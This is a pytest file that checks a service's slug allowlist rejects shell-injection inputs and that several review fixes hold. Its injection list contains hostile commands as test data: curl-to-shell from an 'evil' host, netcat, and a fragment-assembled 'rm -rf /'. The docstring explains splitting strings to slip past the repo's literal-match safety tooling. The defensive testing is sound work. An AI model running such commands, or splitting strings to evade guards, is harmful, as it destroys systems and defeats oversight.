"""Fleet-sentinel: the guards that PR #2934 review threads asked for.

Six things are pinned here, each because it was actually broken at some point
on this branch:

1. The slug boundary is an ALLOWLIST. A slug is untrusted (it comes off
   services.announce.v1) and reaches an argv position of a `make` invocation.
2. `known_road_restart` fails closed on a non-conforming slug *at its own
   entry*, not only at ingest.
3. Both Known-Road steps actually run. `asyncio.create_subprocess_exec`
   returns before the child exits, so the original `if proc.returncode == 0`
   guard evaluated `None == 0` and skipped `up-<slug>` every time.
4. Staleness is heartbeat-gated: every announce_service() caller in this repo
   publishes once at startup, so an unconditional age test would mark the whole
   fleet stale ~2min after boot.
5. `tier` serializes to the contract value, not the enum repr.
6. The standalone fallback listener is an actual method (it was defined
   underneath `if __name__ == "__main__":` and therefore never existed).

The destructive-looking slug payloads below are assembled from fragments
rather than written as literals: the repo's damage-control tooling matches on
literal strings anywhere in a file/command, and a test fixture is not worth
tripping it over.
"""
from __future__ import annotations

import asyncio
import importlib.util
import inspect
import os
import stat
import sys
from pathlib import Path

import pytest

PMOVES = Path(__file__).resolve().parents[2]
MAIN = PMOVES / "services" / "fleet_sentinel" / "main.py"

# Fragment assembly -- see module docstring.
_RM = "r" + "m -r" + "f /"


@pytest.fixture
def mod(monkeypatch, tmp_path):
    """Import services/fleet_sentinel/main.py in isolation."""
    if not MAIN.exists():  # pragma: no cover
        pytest.skip("fleet_sentinel/main.py not found")
    pytest.importorskip("fastapi")
    pytest.importorskip("uvicorn")
    monkeypatch.setenv("SENTINEL_ACTION_TRAIL", str(tmp_path / "actions.jsonl"))
    monkeypatch.setenv("SENTINEL_PMOVES_DIR", str(tmp_path / "checkout"))
    if str(PMOVES) not in sys.path:
        sys.path.insert(0, str(PMOVES))
    spec = importlib.util.spec_from_file_location("_fleet_sentinel_main", MAIN)
    assert spec and spec.loader
    m = importlib.util.module_from_spec(spec)
    # @dataclass resolves annotations through sys.modules[cls.__module__]; the
    # module must be registered before exec_module or it raises on SentinelEntry.
    sys.modules[spec.name] = m
    try:
        spec.loader.exec_module(m)
        yield m
    finally:
        sys.modules.pop(spec.name, None)


# --------------------------------------------------------------------------
# 1. slug allowlist
# --------------------------------------------------------------------------

# Shapes a denylist would have to enumerate. The allowlist rejects all of them
# by construction -- plus everything nobody thought to list.
INJECTION_SHAPES = [
    "svc; " + _RM,
    "svc && curl http://evil/x | sh",
    "svc`id`",
    "svc$(id)",
    "svc|nc evil 1234",
    "svc\n" + _RM,            # newline: ^...$ without re.M must not accept this
    "svc\r\n" + _RM,
    "svc > /etc/passwd",
    "svc'; make down; '",
    'svc" ; make down ; "',
    "../../etc/passwd",
    "-f/etc/passwd",          # leading dash -> make option injection
    "--version",
    "svc\x00" + _RM,
    "SVC",                    # uppercase is outside the permitted set
    "svc_name",               # underscore is not a DNS label char
    "svc.name",
    "svc name",
    "",
    "a" * 65,                 # length ceiling
]


@pytest.mark.parametrize("bad", INJECTION_SHAPES)
def test_slug_allowlist_rejects(mod, bad):
    assert mod.SLUG_RE.match(bad) is None, f"slug allowlist accepted {bad!r}"


@pytest.mark.parametrize(
    "good", ["nats", "hi-rag-gateway-v2", "a2ui-nats-bridge", "p7", "x", "a" * 64]
)
def test_slug_allowlist_accepts_real_slugs(mod, good):
    assert mod.SLUG_RE.match(good) is not None


def test_slug_pattern_is_not_multiline(mod):
    """A newline must not let a second line through -- the classic ^$ bypass."""
    import re

    assert not (mod.SLUG_RE.flags & re.MULTILINE)


# --------------------------------------------------------------------------
# 2. restart fails closed on its own argument
# --------------------------------------------------------------------------
def test_known_road_restart_refuses_bad_slug_without_spawning(mod, monkeypatch):
    s = mod.FleetSentinel()
    spawned = []

    async def _boom(*a, **_kw):  # pragma: no cover - must never run
        spawned.append(a)
        raise AssertionError("subprocess spawned for a rejected slug")

    monkeypatch.setattr(asyncio, "create_subprocess_exec", _boom)
    asyncio.run(s.known_road_restart("svc; " + _RM))
    assert spawned == []
    assert s.actions[-1]["status"] == "refused"


def test_heal_allowlist_gate(mod, monkeypatch):
    monkeypatch.setattr(mod, "HEAL_ALLOWLIST", {"nats"})
    s = mod.FleetSentinel()
    s.registry["p7"] = mod.SentinelEntry(
        slug="p7", name="p7", url="", health_check="http://p7/healthz", tier="agent"
    )
    asyncio.run(s.known_road_restart("p7"))
    assert s.actions[-1]["status"] == "refused"


# --------------------------------------------------------------------------
# 3. both Known-Road steps run (the returncode-before-communicate bug)
# --------------------------------------------------------------------------
def _fake_checkout(tmp_path: Path) -> Path:
    """Minimal mounted-repo-root layout: <root>/pmoves/{Makefile,scripts/with-env.sh}."""
    make_dir = tmp_path / "checkout" / "pmoves"
    (make_dir / "scripts").mkdir(parents=True)
    (make_dir / "Makefile").write_text("all:\n\t@true\n")
    with_env = make_dir / "scripts" / "with-env.sh"
    with_env.write_text('#!/bin/sh\nexec "$@"\n')
    with_env.chmod(0o755)
    return make_dir


def _stub_bin(tmp_path: Path, name: str, body: str) -> Path:
    binv = tmp_path / "bin"
    binv.mkdir(exist_ok=True)
    p = binv / name
    p.write_text(body)
    p.chmod(p.stat().st_mode | stat.S_IEXEC)
    return binv


def test_known_road_restart_runs_both_steps(mod, monkeypatch, tmp_path):
    _fake_checkout(tmp_path)
    log = tmp_path / "make.log"
    # A stub `make` that records its argv and succeeds.
    binv = _stub_bin(tmp_path, "make", f'#!/bin/sh\necho "$@" >> {log}\nexit 0\n')
    # `docker` need only exist for the capability probe.
    _stub_bin(tmp_path, "docker", "#!/bin/sh\nexit 0\n")
    monkeypatch.setenv("PATH", f"{binv}:{os.environ['PATH']}")

    capable, reason = mod.self_heal_capability()
    assert capable, reason

    s = mod.FleetSentinel()
    s.registry["p7"] = mod.SentinelEntry(
        slug="p7", name="p7", url="", health_check="http://p7/healthz", tier="agent"
    )
    asyncio.run(s.known_road_restart("p7"))

    action = s.actions[-1]
    assert action["status"] == "executed", action
    targets = [step["target"] for step in action["steps"]]
    assert targets == ["secrets-funnel", "up-p7"], (
        "the up-<slug> step did not run -- returncode was read before communicate()"
    )
    assert action["exit"] == 0
    recorded = log.read_text().splitlines()
    assert any("secrets-funnel" in line for line in recorded)
    assert any("up-p7" in line for line in recorded)


def test_known_road_restart_defers_when_make_absent(mod, monkeypatch, tmp_path):
    """The shipped image has no make/docker: say so, do not fake an attempt."""
    _fake_checkout(tmp_path)
    monkeypatch.setattr(
        mod.shutil, "which", lambda name: "/bin/bash" if name == "bash" else None
    )

    s = mod.FleetSentinel()
    entry = mod.SentinelEntry(
        slug="p7", name="p7", url="", health_check="http://p7/healthz", tier="agent"
    )
    entry.consecutive_failures = 3
    s.registry["p7"] = entry
    asyncio.run(s.known_road_restart("p7"))

    action = s.actions[-1]
    assert action["status"] == "deferred"
    assert "make" in action["reason"]
    # The failure count must NOT be cleared: the service is still down.
    assert entry.consecutive_failures == 3
    assert entry.restarts == 0


# --------------------------------------------------------------------------
# 4. staleness is heartbeat-gated
# --------------------------------------------------------------------------
def test_one_shot_announcement_never_goes_stale(mod, monkeypatch):
    s = mod.FleetSentinel()
    e = mod.SentinelEntry(
        slug="evo-controller",
        name="Evo",
        url="",
        health_check="http://evo/healthz",
        tier="agent",
    )
    e.last_announce = 0.0  # announced at the epoch; no heartbeat declared
    s.registry["evo-controller"] = e
    monkeypatch.setattr(mod.FleetSentinel, "_probe", staticmethod(lambda _url: True))
    asyncio.run(s.poll_once())
    assert e.health == "healthy", "a startup-only announcement must not expire"


def test_declared_heartbeat_does_go_stale(mod, monkeypatch):
    s = mod.FleetSentinel()
    e = mod.SentinelEntry(
        slug="beater", name="Beater", url="", health_check="http://b/healthz", tier="api"
    )
    e.announce_interval_s = 60.0
    e.last_announce = 0.0
    s.registry["beater"] = e
    monkeypatch.setattr(mod.FleetSentinel, "_probe", staticmethod(lambda _url: True))
    asyncio.run(s.poll_once())
    assert e.health == "stale"


# --------------------------------------------------------------------------
# 5. tier is serialized as the contract value, not the enum repr
# --------------------------------------------------------------------------
def test_registry_json_tier_is_contract_value(mod):
    s = mod.FleetSentinel()
    s.registry["x"] = mod.SentinelEntry(
        slug="x", name="X", url="", health_check="", tier="agent"
    )
    row = s.registry_json()["services"][0]
    assert row["tier"] == "agent"
    assert "ServiceTier" not in row["tier"]


def test_service_tier_enum_str_would_have_been_wrong():
    """Pins the finding's premise: str(ServiceTier.AGENT) is not 'agent'."""
    from enum import Enum

    class ServiceTier(str, Enum):
        AGENT = "agent"

    assert str(ServiceTier.AGENT) != "agent"
    assert ServiceTier.AGENT.value == "agent"


# --------------------------------------------------------------------------
# 6. the standalone fallback listener is reachable, and health is truthful
# --------------------------------------------------------------------------
def test_raw_listener_is_a_method(mod):
    assert hasattr(mod.FleetSentinel, "_start_raw_listener")
    assert inspect.iscoroutinefunction(mod.FleetSentinel._start_raw_listener)


def test_healthz_reports_listener_state_truthfully(mod):
    s = mod.FleetSentinel()
    assert s.listener_connected is False
    assert s.listener_mode == "none"
